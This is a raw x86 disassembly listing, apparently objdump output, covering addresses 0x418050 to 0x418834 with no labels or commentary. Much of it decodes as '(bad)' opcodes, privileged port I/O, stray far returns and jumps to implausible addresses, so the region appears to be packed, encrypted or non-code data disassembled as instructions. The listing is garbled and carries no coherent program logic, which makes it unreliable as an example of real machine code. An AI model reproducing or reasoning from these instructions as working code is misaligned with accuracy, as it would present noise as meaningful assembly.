  418050:	pushf  
  418051:	xor    edi,eax
  418053:	pushf  
  418054:	mov    ah,0x89
  418056:	test   eax,ebp
  418058:	clc    
  418059:	inc    ebp
  41805a:	inc    ebp
  41805b:	mov    DWORD PTR [eax+eax*8],esi
  41805e:	sub    al,0x30
  418060:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  418067:	dec    ebp
  418068:	xor    eax,DWORD PTR fs:[edi+0x3]
  41806c:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  418072:	xor    eax,DWORD PTR fs:[edi+0x3]
  418076:	or     DWORD PTR [ecx+0x45ff085c],0x0
  41807d:	shl    DWORD PTR [ebp-0x380064],1
  418083:	int3   
  418084:	lea    eax,[ebp+0x45fff860]
  41808a:	push   eax
  41808b:	xor    dh,BYTE PTR [ebp-0x64]
  41808e:	(bad)  
  41808f:	(bad)  
  418090:	pop    esp
  418091:	lods   al,BYTE PTR ds:[esi]
  418092:	inc    DWORD PTR [ebp+0x4508f8ff]
  418098:	mov    edi,DWORD PTR [eax+edx*8]
  41809b:	pushf  
  41809c:	jo     0x418065
  41809e:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  4180a5:	inc    ebp
  4180a6:	add    BYTE PTR [esi],bh
  4180a8:	push   0x8b809c
  4180ad:	in     al,dx
  4180ae:	inc    ebp
  4180af:	push   ebp
  4180b0:	mov    esi,DWORD PTR [ebx]
  4180b2:	cld    
  4180b3:	add    eax,DWORD PTR [eax+0xf013b]
  4180b9:	adc    al,0x0
  4180bb:	add    bh,bh
  4180bd:	jmp    0xbe81da
  4180c2:	add    BYTE PTR [ebp+0x45],cl
  4180c5:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  4180cb:	dec    ebp
  4180cc:	push   0x38033
  4180d1:	cmp    eax,DWORD PTR [eax]
  4180d3:	unpcklps xmm7,xmm0
  4180d6:	jne    0x4180d8
  4180d8:	dec    DWORD PTR [ebx+0x5545cc18]
  4180de:	mov    DWORD PTR [ebx],esi
  4180e0:	shl    BYTE PTR [ebx],1
  4180e2:	inc    ebp
  4180e3:	add    ecx,DWORD PTR [ecx+0x60fc803]
  4180e9:	retf   0x5575
  4180ec:	dec    DWORD PTR [ebx-0x5ba17e8]
  4180f2:	(bad)  
  4180f3:	stc    
  4180f4:	in     al,dx
  4180f5:	or     al,0x85
  4180f7:	dec    ebp
  4180f8:	clc    
  4180f9:	xor    eax,DWORD PTR [ebp+0x3]
  4180fc:	mov    ebp,ecx
  4180fe:	rol    BYTE PTR [eax],1
  418100:	inc    ebp
  418101:	add    BYTE PTR [eax-0x7747ab3],bh
  418107:	clc    
  418108:	inc    ebp
  418109:	retf   
  41810a:	mov    edx,ebx
  41810c:	in     al,dx
  41810d:	(bad)  
  41810e:	retf   
  41810f:	into   
  418110:	into   
  418111:	scas   eax,DWORD PTR es:[edi]
  418112:	dec    ebp
  418113:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  418119:	sub    ecx,esi
  41811b:	cmp    ecx,DWORD PTR [ebp+0x77]
  41811e:	(bad)  
  41811f:	mov    edi,eax
  418121:	int3   
  418122:	test   DWORD PTR [ecx-0x74baff08],ecx
  418128:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  41812f:	xor    eax,DWORD PTR [ebp+0x4503f803]
  418135:	(bad)  
  418137:	retf   0x559c
  41813a:	(bad)  
  41813b:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  418142:	inc    ebp
  418143:	add    eax,0xeb9c4d3f
  418148:	(bad)  
  418149:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  41814f:	xor    ecx,DWORD PTR [ebp+0x33]
  418152:	mov    eax,DWORD PTR [ebx]
  418154:	call   0xce514c5c
  418159:	retf   0x55d1
  41815c:	test   BYTE PTR [ebx-0x5ff17fe],cl
  418162:	jmp    0x41815d
  418164:	add    BYTE PTR ds:0xebf44d8b,al
  41816a:	push   ebp
  41816b:	mov    ebp,DWORD PTR [ebx]
  41816d:	mov    eax,0x33f8558b
  418172:	retf   
  418173:	xor    ecx,esi
  418175:	add    edx,ecx
  418177:	add    eax,DWORD PTR [edx+0xca010f]
  41817d:	push   ebp
  41817e:	dec    ebp
  41817f:	mov    ecx,DWORD PTR [ebx-0x34050718]
  418185:	stc    
  418186:	rol    DWORD PTR ds:0xebce4dd6,cl
  41818c:	scas   eax,DWORD PTR es:[edi]
  41818d:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  418193:	xor    ebp,DWORD PTR [ebx]
  418195:	xor    edi,DWORD PTR [ebx]
  418197:	add    esi,DWORD PTR [edi+0x3]
  41819a:	mov    ecx,DWORD PTR [edi]
  41819c:	clc    
  41819d:	retf   0x55cb
  4181a0:	into   
  4181a1:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  4181a8:	test   al,0x4d
  4181aa:	push   ebp
  4181ab:	jbe    0x4181e0
  4181ad:	mov    esi,DWORD PTR [ebx]
  4181af:	mov    al,0x3
  4181b1:	push   ebp
  4181b2:	add    esi,DWORD PTR [ebx]
  4181b4:	rdpmc  
  4181b6:	retf   0x5503
  4181b9:	add    ecx,DWORD PTR [ebx-0x53517f1]
  4181bf:	dec    ebp
  4181c0:	stc    
  4181c1:	mov    ecx,DWORD PTR [eax]
  4181c3:	or     BYTE PTR [ebp+0x4d],cl
  4181c6:	jmp    0x1358256
  4181cb:	dec    ebp
  4181cc:	dec    ebp
  4181cd:	(bad)  
  4181ce:	mov    ebx,esp
  4181d0:	clc    
  4181d1:	test   ebx,ecx
  4181d3:	clc    
  4181d4:	ror    DWORD PTR [ebp-0x2a],cl
  4181d7:	mov    esi,ecx
  4181d9:	lock scas eax,DWORD PTR es:[edi]
  4181db:	inc    ebp
  4181dc:	mov    esi,DWORD PTR [ebx]
  4181de:	hlt    
  4181df:	pushf  
  4181e0:	jge    0x41816d
  4181e2:	sub    ebx,esp
  4181e4:	cmp    ecx,ebx
  4181e6:	ja     0x4181b6
  4181e8:	mov    ebp,DWORD PTR [eax-0x58]
  4181eb:	dec    ebp
  4181ec:	xor    ecx,DWORD PTR [di+0x3]
  4181f0:	mov    esp,esp
  4181f2:	clc    
  4181f3:	push   ebp
  4181f4:	retf   
  4181f5:	mov    dl,bl
  4181f7:	adc    esi,edx
  4181f9:	jb     0x4181c9
  4181fb:	add    BYTE PTR [edi-0xb7474b3],ch
  418201:	lock jge 0x4181cf
  418204:	sub    ecx,DWORD PTR [ebp+0x3b]
  418207:	mov    esi,DWORD PTR [edi-0x20]
  41820a:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  418211:	mov    BYTE PTR [ebx-0x34b20729],cl
  418217:	mov    edx,ebx
  418219:	lock (bad) 
  41821b:	ror    esi,cl
  41821d:	push   ebp
  41821e:	scas   eax,DWORD PTR es:[edi]
  41821f:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  418225:	pushf  
  418226:	sub    esi,DWORD PTR [edx]
  418228:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  41822e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41822f:	xor    esp,DWORD PTR [ebx]
  418231:	add    ecx,DWORD PTR [ebp-0x1c]
  418234:	mov    edi,DWORD PTR [ebp-0x8]
  418237:	mov    bl,cl
  418239:	cmp    dl,bl
  41823b:	jb     0x41820b
  41823d:	add    dh,dl
  41823f:	dec    ebp
  418240:	scas   eax,DWORD PTR es:[edi]
  418241:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  418247:	shr    DWORD PTR [ebx],cl
  418249:	into   
  41824a:	cmp    edx,esi
  41824c:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  418252:	dec    ebp
  418253:	dec    ebp
  418254:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  41825a:	retf   
  41825b:	xor    edx,esi
  41825d:	add    ecx,esi
  41825f:	imul   ecx,edx
  418262:	mov    DWORD PTR [ebp+0x8],edx
  418265:	xor    ecx,DWORD PTR [ebp+0x2b]
  418268:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  41826e:	add    esi,DWORD PTR [ebx]
  418270:	rol    BYTE PTR [ebx],0x45
  418273:	rdtsc  
  418275:	xlat   BYTE PTR ds:[ebx]
  418276:	pushf  
  418277:	jge    0x418202
  418279:	xor    esp,eax
  41827b:	sub    eax,DWORD PTR [ebp-0x73]
  41827e:	(bad)  
  41827f:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  418286:	dec    ebp
  418287:	xchg   BYTE PTR [ebx],dh
  418289:	inc    DWORD PTR [ebx]
  41828b:	(bad)  
  41828c:	jmp    0x4182db
  41828e:	mov    ecx,DWORD PTR [ebx-0x34341324]
  418294:	dec    ebp
  418295:	into   
  418296:	mov    ebp,DWORD PTR [edi-0x23737420]
  41829c:	pushf  
  41829d:	shl    DWORD PTR [edx],cl
  41829f:	retf   0x5588
  4182a2:	or     ecx,DWORD PTR [ebp+0x7233114d]
  4182a8:	add    eax,DWORD PTR [eax]
  4182aa:	in     al,0x4d
  4182ac:	push   ebp
  4182ad:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  4182b3:	fs add ch,cl
  4182b6:	dec    ebp
  4182b7:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  4182bd:	dec    ebp
  4182be:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  4182c4:	jge    0x418294
  4182c6:	mov    BYTE PTR [edi+0xf723b3a],ch
  4182cc:	add    cl,dh
  4182ce:	dec    ebp
  4182cf:	dec    DWORD PTR [ebx-0x2c032301]
  4182d5:	inc    ebp
  4182d6:	push   ebp
  4182d7:	dec    DWORD PTR [ebx-0x73ff1f34]
  4182dd:	lea    ebx,[esp+edx*2+0x508bff32]
  4182e4:	mov    ah,0x45
  4182e6:	push   ebp
  4182e7:	mov    esi,DWORD PTR [ebx]
  4182e9:	les    esi,FWORD PTR [ebx]
  4182eb:	add    BYTE PTR [ebx],al
  4182ed:	inc    DWORD PTR [ebx]
  4182ef:	mov    ecx,DWORD PTR [edi]
  4182f1:	cld    
  4182f2:	retf   0x4d80
  4182f5:	add    DWORD PTR [ecx+0x4d30e400],ecx
  4182fb:	jne    0x418288
  4182fd:	(bad)  
  4182fe:	in     al,dx
  4182ff:	ror    bl,1
  418301:	scas   al,BYTE PTR es:[edi]
  418302:	into   
  418303:	add    BYTE PTR [edi-0xf2f7475],ch
  418309:	not    bl
  41830b:	adc    al,0xca
  41830d:	inc    ebp
  41830e:	push   ebp
  41830f:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  418315:	push   0xaf80d6
  41831a:	mov    eax,DWORD PTR [eax]
  41831c:	fdiv   st(7),st
  41831e:	sti    
  41831f:	sbb    dh,cl
  418321:	pop    esi
  418322:	xchg   esp,eax
  418323:	leave  
  418324:	pushf  
  418325:	add    al,0x32
  418327:	push   ebp
  418328:	cmp    ebp,esp
  41832a:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  41832e:	dec    DWORD PTR [ecx-0x740f0375]
  418334:	push   ebp
  418335:	cld    
  418336:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  41833c:	retf   0x558b
  41833f:	clc    
  418340:	xor    esi,eax
  418342:	add    esi,DWORD PTR [ebp-0x75]
  418345:	(bad)  
  418346:	hlt    
  418347:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  41834e:	mov    DWORD PTR [edx],ecx
  418350:	hlt    
  418351:	(bad)  
  418352:	dec    ebp
  418353:	add    dh,BYTE PTR [ebx]
  418355:	leave  
  418356:	mov    edx,0xffec8d55
  41835b:	push   ecx
  41835c:	rol    DWORD PTR [ebp+0x55],1
  41835f:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  418365:	mov    eax,0xf8030b33
  41836a:	lar    ecx,di
  41836d:	push   ebp
  41836e:	retf   0x863b
  418371:	jne    0x418370
  418373:	mov    edi,edi
  418375:	or     BYTE PTR [ebp+0x41],dh
  418378:	mov    ebp,esp
  41837a:	cld    
  41837b:	inc    eax
  41837c:	mov    al,0x25
  41837e:	add    DWORD PTR [ecx+0x0],eax
  418381:	in     eax,dx
  418382:	test   DWORD PTR [ecx-0x1],eax
  418385:	fdiv   st(7),st
  418387:	ret    0x8b
  41838a:	cld    
  41838b:	mov    eax,DWORD PTR [eax+0x8d0151]
  418391:	clc    
  418392:	xor    BYTE PTR [ebp+0x45],al
  418395:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  41839b:	loopne 0x41839c
  41839d:	mov    edi,edi
  41839f:	mov    ecx,eax
  4183a1:	clc    
  4183a2:	jne    0x418374
  4183a4:	call   0x8294ad
  4183a9:	and    eax,0xc6854575
  4183ae:	je     0x4183b1
  4183b0:	mov    eax,esi
  4183b2:	cld    
  4183b3:	or     DWORD PTR [eax+0x401c9],eax
  4183b9:	push   ebp
  4183ba:	add    ah,ch
  4183bc:	add    BYTE PTR [ecx+0x6a],dl
  4183bf:	inc    ebp
  4183c0:	push   esi
  4183c1:	mov    DWORD PTR [eax-0x4],edx
  4183c4:	pop    edi
  4183c5:	mov    ebx,DWORD PTR [ebx-0x4]
  4183c8:	ret    0xbe
  4183cb:	push   es
  4183cc:	mov    ecx,DWORD PTR [ecx-0x77274af]
  4183d2:	clc    
  4183d3:	lock inc ebp
  4183d5:	jne    0x41842d
  4183d7:	(bad)  
  4183d8:	jne    0x4183de
  4183da:	mov    eax,0xf841ba66
  4183df:	fadd   QWORD PTR [esi]
  4183e1:	(bad)  
  4183e2:	jne    0x418421
  4183e4:	cmp    eax,ebx
  4183e6:	pop    esi
  4183e7:	mov    ecx,DWORD PTR [eax]
  4183e9:	push   ecx
  4183ea:	inc    ecx
  4183eb:	lea    esi,[eax-0x8]
  4183ee:	inc    edx
  4183ef:	inc    ebp
  4183f0:	int    0x8b
  4183f2:	inc    edx
  4183f3:	cld    
  4183f4:	jo     0x4183b5
  4183f6:	inc    ecx
  4183f7:	xchg   edx,esp
  4183f9:	mov    ebx,eax
  4183fb:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  418401:	or     edi,eax
  418403:	inc    ebp
  418404:	inc    ebp
  418405:	(bad)  
  418406:	mov    ecx,DWORD PTR [eax]
  418408:	cld    
  418409:	(bad)  
  41840a:	jmp    0x41840d
  41840c:	mov    eax,esi
  41840e:	mov    DWORD PTR ds:0x4f8c98b,eax
  418414:	rcl    BYTE PTR [esi+0xf],1
  418417:	iret   
  418418:	inc    ebp
  418419:	leave  
  41841a:	(bad)  
  41841b:	dec    DWORD PTR [ecx]
  41841d:	mov    eax,esi
  41841f:	mov    eax,DWORD PTR [edi]
  418421:	mov    dh,0xdd
  418424:	push   es
  418425:	nop
  418426:	(bad)  
  418427:	inc    DWORD PTR [ebx]
  418429:	push   esi
  41842a:	leave  
  41842b:	iret   
  41842c:	add    al,0x46
  41842e:	push   ebp
  41842f:	jmp    0xff92da20
  418434:	inc    ebp
  418435:	push   esi
  418436:	mov    DWORD PTR [esi-0x4],eax
  418439:	in     eax,dx
  41843a:	push   ebp
  41843b:	sbb    BYTE PTR [eax+0x7c6daff],bh
  418441:	add    al,BYTE PTR [edx]
  418443:	mov    edx,DWORD PTR [ebp-0x17]
  418446:	cmp    edi,esi
  418448:	jne    0x418449
  41844a:	(bad)  
  41844b:	push   esi
  41844c:	pop    es
  41844d:	push   ebp
  41844e:	mov    ebp,esp
  418450:	or     BYTE PTR [ebp+0x41],al
  418453:	add    edi,esp
  418455:	sub    BYTE PTR [eax-0x4],al
  418458:	int3   
  418459:	jne    0x41841d
  41845b:	add    DWORD PTR [eax],eax
  41845d:	sbb    al,0x8b
  41845f:	mov    edx,DWORD PTR [ecx+0x14]
  418462:	lea    edx,[edx-0x1ba7508]
  418468:	push   esi
  418469:	enter  0xd375,0xb8
  41846d:	test   DWORD PTR [esi],0x6ce0750
  418473:	enter  0xd375,0x3b
  418477:	neg    DWORD PTR [esi+0x50]
  41847a:	or     cl,dl
  41847c:	inc    edx
  41847d:	(bad)  
  41847e:	loope  0x41846c
  418480:	(bad)  
  418481:	sub    eax,DWORD PTR [ebx]
  418483:	inc    eax
  418484:	loope  0x4184d6
  418486:	add    dl,BYTE PTR [eax-0x37]
  418489:	push   edi
  41848a:	push   ebp
  41848b:	imul   ah
  41848d:	adc    DWORD PTR [ecx-0x1],0x45
  418491:	add    BYTE PTR [ecx+0x55d3fc00],cl
  418497:	lea    edi,[eax-0x7fff4ca]
  41849d:	mov    eax,0x4550402
  4184a2:	cmp    ebp,ecx
  4184a4:	jne    0x418451
  4184a6:	mov    eax,DWORD PTR ds:0x241e808
  4184ac:	in     eax,dx
  4184ad:	add    BYTE PTR [eax-0x7],al
  4184b0:	out    0x36,eax
  4184b2:	inc    ecx
  4184b3:	aas    
  4184b4:	jmp    0xcd4736
  4184b9:	lock mov edi,DWORD PTR [ebp-0x18]
  4184bd:	and    edi,edi
  4184bf:	mov    edi,edi
  4184c1:	call   0xe40f859d
  4184c6:	push   es
  4184c7:	add    al,ch
  4184c9:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  4184d0:	(bad)  
  4184d1:	hlt    
  4184d2:	add    eax,0xffd3e87d
  4184d7:	cmp    bh,0x8
  4184da:	(bad)  
  4184db:	fld    DWORD PTR [esi]
  4184dd:	out    dx,al
  4184de:	call   0xffa083e6
  4184e3:	cmp    al,0x46
  4184e5:	shl    edx,0x8
  4184e8:	(bad)  
  4184e9:	pop    es
  4184ea:	fisttp QWORD PTR [ebp+0xe577eff]
  4184f0:	push   ebx
  4184f1:	add    BYTE PTR [ebx+0x24008b56],cl
  4184f7:	add    BYTE PTR [ebp+0x50],al
  4184fa:	push   eax
  4184fb:	add    DWORD PTR [ebx+0x757d1834],ecx
  418501:	sub    edx,DWORD PTR [esi-0x24]
  418504:	jne    0x4184bc
  418506:	lods   eax,DWORD PTR ds:[esi]
  418507:	mov    edx,DWORD PTR [edx-0x34]
  41850a:	dec    esi
  41850b:	out    0x83,eax
  41850d:	into   
  41850e:	push   edi
  418510:	loopne 0x4184e0
  418512:	shr    BYTE PTR [edx+ecx*4+0x0],1
  418516:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  41851d:	rol    DWORD PTR [edx],0x8
  418520:	mov    esp,ecx
  418522:	cmp    DWORD PTR [ebx],0xc
  418525:	mov    esi,0x5001c0
  41852a:	push   eax
  41852b:	push   cs
  41852c:	push   eax
  41852d:	(bad)  
  41852e:	sub    edx,edi
  418530:	push   esi
  418531:	adc    al,0xcb
  418533:	ins    DWORD PTR es:[edi],dx
  418534:	mov    eax,0x203e8
  418539:	add    al,ah
  41853b:	inc    esi
  41853c:	mov    al,ch
  41853e:	pop    es
  41853f:	add    DWORD PTR [eax],0x1
  418542:	add    dh,al
  418544:	add    ah,ch
  418546:	rol    DWORD PTR [edx-0xd],1
  418549:	cli    
  41854a:	push   0x4a
  41854c:	pop    ecx
  41854d:	retf   0xfe6
  418550:	add    BYTE PTR [ebx-0x4e72f41e],al
  418556:	(bad)  
  418557:	dec    BYTE PTR [ebx+0x45b1fc72]
  41855d:	(bad)  
  41855e:	sub    ebp,DWORD PTR [ebx]
  418560:	and    al,0x52
  418562:	(bad)  
  418563:	dec    edi
  418564:	inc    ebp
  418565:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  41856c:	add    BYTE PTR [ebp-0x7b],dh
  41856f:	pop    eax
  418570:	add    BYTE PTR [edx+0x0],bl
  418573:	pop    edx
  418574:	dec    ebp
  418575:	jmp    DWORD PTR [ebx]
  418577:	and    al,0xec
  418579:	push   edx
  41857a:	out    0x64,eax
  41857c:	jmp    0xd3f37b81
  418581:	jmp    0x4185db
  418583:	mov    al,0xfe
  418585:	dec    BYTE PTR [ebp-0x18fd8018]
  41858b:	add    BYTE PTR [esi+ebp*1],bh
  41858e:	pop    edx
  41858f:	icebp  
  418590:	mov    eax,cs
  418592:	ins    BYTE PTR es:[edi],dx
  418593:	adc    eax,0x75510000
  418598:	mov    esi,0x70158
  41859d:	or     DWORD PTR [eax-0x74f48dfe],esi
  4185a3:	mov    edi,esp
  4185a5:	cld    
  4185a6:	jge    0x41861d
  4185a8:	(bad)  
  4185aa:	aas    
  4185ab:	and    al,0x6d
  4185ad:	adc    cl,0x1
  4185b0:	mov    eax,DWORD PTR [eax]
  4185b2:	and    ecx,DWORD PTR [ebx-0x167203fd]
  4185b8:	dec    ebp
  4185b9:	add    eax,ebp
  4185bb:	add    BYTE PTR [edx],al
  4185bd:	fadd   DWORD PTR [eax]
  4185bf:	stc    
  4185c0:	enter  0xee00,0x8b
  4185c4:	sbb    eax,0x1
  4185c7:	sbb    esi,ecx
  4185c9:	in     al,0x0
  4185cb:	in     eax,dx
  4185cc:	add    BYTE PTR [eax],al
  4185ce:	jne    0x41855b
  4185d0:	cmp    edx,esp
  4185d2:	jb     0x4185dd
  4185d4:	jmp    0x41864b
  4185d6:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  4185dc:	add    BYTE PTR [ebx+0x4d83d840],cl
  4185e2:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  4185e8:	jb     0x418573
  4185ea:	pop    edx
  4185eb:	fadd   QWORD PTR [ebx-0x7445faa1]
  4185f1:	or     dh,BYTE PTR [edx+0x0]
  4185f4:	inc    edx
  4185f5:	or     dl,bh
  4185f7:	xlat   BYTE PTR ds:[ebx]
  4185f8:	dec    edx
  4185f9:	push   edi
  4185fa:	add    al,0x7
  4185fc:	leave  
  4185fd:	rol    DWORD PTR [edx+eax*1],0x7
  418601:	add    ecx,ecx
  418603:	mov    edx,ecx
  418605:	int3   
  418606:	jmp    0x4185c6
  418608:	mov    al,0x0
  41860a:	(bad)  
  41860b:	jne    0x4185f5
  41860d:	mov    eax,DWORD PTR [edx]
  41860f:	call   0xc1560314
  418614:	pop    edi
  418615:	add    ebx,DWORD PTR [ecx-0x37]
  418618:	pop    ecx
  418619:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  418620:	push   es
  418621:	mov    eax,DWORD PTR [eax]
  418623:	int3   
  418624:	add    ch,al
  418626:	jae    0x418610
  418628:	int    0x1
  41862a:	enter  0x3000,0x18
  41862e:	add    BYTE PTR [ebp+0x75],al
  418631:	mov    esi,DWORD PTR [eax-0x171f0134]
  418637:	push   0x2
  418639:	pop    ecx
  41863a:	add    BYTE PTR [eax],cl
  41863c:	push   ebx
  41863d:	lea    edi,[edi+eax*2]
  418640:	mov    al,0x1
  418642:	jb     0x418644
  418644:	mov    al,0x10
  418646:	push   eax
  418647:	add    al,0x75
  418649:	add    BYTE PTR [ebx],ch
  41864b:	add    ebx,esp
  41864d:	int3   
  41864e:	jne    0x418660
  418650:	movsx  edx,cl
  418653:	add    DWORD PTR [eax],eax
  418655:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  41865c:	mov    gs,edi
  41865e:	add    BYTE PTR [eax-0x50],ch
  418661:	add    al,ch
  418663:	mov    eax,DWORD PTR [ecx]
  418665:	sub    eax,DWORD PTR [eax]
  418667:	jb     0x4186de
  418669:	add    DWORD PTR [esp+eiz*8-0x50],esi
  41866d:	jge    0x418657
  41866f:	add    al,0x1
  418671:	add    DWORD PTR [eax],0x0
  418674:	jne    0x418676
  418676:	je     0x4186bd
  418678:	mov    eax,DWORD PTR [edi]
  41867a:	ror    BYTE PTR [ebp+0x4d],1
  41867d:	or     DWORD PTR [ecx+0x4d03d004],0x3
  418684:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  41868a:	mov    DWORD PTR [ebx],ebp
  41868c:	fadd   DWORD PTR [eax+0x75]
  41868f:	inc    eax
  418690:	pop    eax
  418691:	lea    ebx,[ecx+0x4f]
  418694:	push   0xb1000003
  418699:	out    dx,eax
  41869a:	add    ebp,DWORD PTR [edx+edx*2]
  41869d:	add    BYTE PTR [ebx+ecx*4],bh
  4186a0:	mov    ch,BYTE PTR [ebx]
  4186a2:	jb     0x418716
  4186a4:	add    al,0x89
  4186a6:	push   eax
  4186a7:	call   0x8429d419
  4186ac:	add    DWORD PTR [eax+eax*1],eax
  4186af:	jae    0x4186c5
  4186b1:	icebp  
  4186b2:	inc    ebp
  4186b3:	mov    eax,DWORD PTR gs:[ecx]
  4186b6:	int3   
  4186b7:	out    dx,al
  4186b8:	loopne 0x418707
  4186ba:	sub    eax,DWORD PTR [edx]
  4186bc:	push   0xffffff83
  4186be:	pop    esi
  4186bf:	push   cs
  4186c0:	jl     0x4186db
  4186c2:	add    al,0xaf
  4186c4:	xor    eax,0x832b6d00
  4186c9:	mov    eax,DWORD PTR [edx]
  4186cb:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4186d1:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4186d7:	inc    ebp
  4186d8:	shr    ebx,0x3
  4186db:	or     DWORD PTR [eax],0x4
  4186de:	push   0xffffffa5
  4186e0:	pop    esi
  4186e1:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  4186e8:	jmp    0x418747
  4186ea:	mov    edi,0xff0272
  4186ef:	fdivr  QWORD PTR [ebp+0x5d]
  4186f2:	push   0x4e
  4186f4:	pop    ecx
  4186f5:	call   0x41cafa
  4186fa:	mov    DWORD PTR [ebx],eax
  4186fc:	in     al,0xc8
  4186fe:	rol    BYTE PTR [ebp-0x75],0xc1
  418702:	call   0xab88e3
  418707:	pop    esi
  418708:	enter  0xceff,0x8b
  41870c:	repz mov ecx,DWORD PTR [ebp-0x34]
  418710:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  418717:	je     0x418719
  418719:	or     DWORD PTR [ebx-0x74183b24],eax
  41871f:	jne    0x418705
  418721:	jmp    0x41871c
  418723:	push   DWORD PTR [edx-0x24]
  418726:	push   0x4d
  418728:	pop    ecx
  418729:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  41872d:	jge    0x418735
  41872f:	mov    eax,eax
  418731:	sub    ebp,DWORD PTR [edx+0x24]
  418734:	pop    esi
  418735:	inc    ebp
  418736:	mov    esp,0x8b6077
  41873b:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  418741:	lods   al,BYTE PTR ds:[esi]
  418742:	add    BYTE PTR [ebx],bh
  418744:	enter  0xce73,0x49
  418748:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  418750:	stc    
  418751:	jge    0x4187c5
  418753:	jnp    0xdd410ab4
  418759:	call   0xc4882f
  41875e:	fadd   st(0),st
  418760:	dec    esi
  418761:	ins    BYTE PTR es:[edi],dx
  418762:	stc    
  418763:	cmp    al,0x73
  418765:	push   ebp
  418766:	mov    eax,0xf8028b
  41876b:	jne    0x41872e
  41876d:	mov    esi,ecx
  41876f:	mov    esp,DWORD PTR [ebp+0x2c]
  418772:	add    edi,DWORD PTR [ebp-0x24]
  418775:	sub    esp,eax
  418777:	and    al,0x45
  418779:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  41877f:	sbb    al,0xee
  418781:	pop    esi
  418782:	call   0x8187b2
  418787:	fsubr  st,st(3)
  418789:	sti    
  41878a:	add    BYTE PTR gs:[ecx],bh
  41878d:	add    eax,esp
  41878f:	add    DWORD PTR [esi],eax
  418791:	rol    DWORD PTR [ebp+0x8],0x29
  418795:	mov    esp,eax
  418797:	clc    
  418798:	jne    0x41880f
  41879a:	mov    eax,0x8b0673
  41879f:	loopne 0x4187e6
  4187a1:	loopne 0x41872c
  4187a3:	lods   al,BYTE PTR ds:[esi]
  4187a4:	int3   
  4187a5:	inc    ebp
  4187a6:	mov    DWORD PTR gs:[eax+edi*8],eax
  4187aa:	add    al,0xc3
  4187ac:	sub    ecx,DWORD PTR [ebp+0x47]
  4187af:	(bad)  
  4187b1:	shr    BYTE PTR [ebp-0x1f],0xe8
  4187b5:	add    eax,DWORD PTR [eax]
  4187b7:	call   0x64348bc
  4187bc:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4187c2:	dec    esi
  4187c3:	ins    DWORD PTR es:[edi],dx
  4187c4:	in     al,dx
  4187c5:	lea    eax,[eax]
  4187c7:	inc    ebp
  4187c8:	inc    ebp
  4187c9:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4187cf:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4187d9:	and    al,0xdc
  4187db:	ror    DWORD PTR [edx+0x24],0xf7
  4187df:	or     BYTE PTR [ebp+0x4c],dh
  4187e2:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4187e6:	stos   BYTE PTR es:[edi],al
  4187e7:	adc    edx,edi
  4187e9:	inc    esp
  4187ea:	add    edi,DWORD PTR [eax]
  4187ec:	jne    0x4187d1
  4187ee:	mov    DWORD PTR [eax-0x7449db04],ecx
  4187f4:	cmp    ecx,DWORD PTR [edi]
  4187f6:	sub    BYTE PTR [ebp-0x7e],dl
  4187f9:	sar    ebp,0xb
  4187fc:	jmp    FWORD PTR [edi+0x2400392a]
  418802:	sub    esi,DWORD PTR [ebx-0x73]
  418805:	mov    esp,DWORD PTR [ecx+edi*4]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	and    BYTE PTR [eax],al
  41880c:	jne    0x4187d8
  41880e:	sub    ebp,ecx
  418810:	sbb    BYTE PTR [esi+0x32],ah
  418813:	dec    ebp
  418814:	push   ebp
  418815:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41881b:	ret    
  41881c:	mov    edx,ebp
  41881e:	leave  
  41881f:	sub    DWORD PTR [esi+0x24],ebx
  418822:	ret    0x2b
  418825:	pop    ax
  418827:	push   ebp
  418828:	rol    BYTE PTR [ebx],0xeb
  41882b:	add    DWORD PTR [ecx+0x6c0001],0x40
  418832:	jb     0x418889
  418834:	ret    
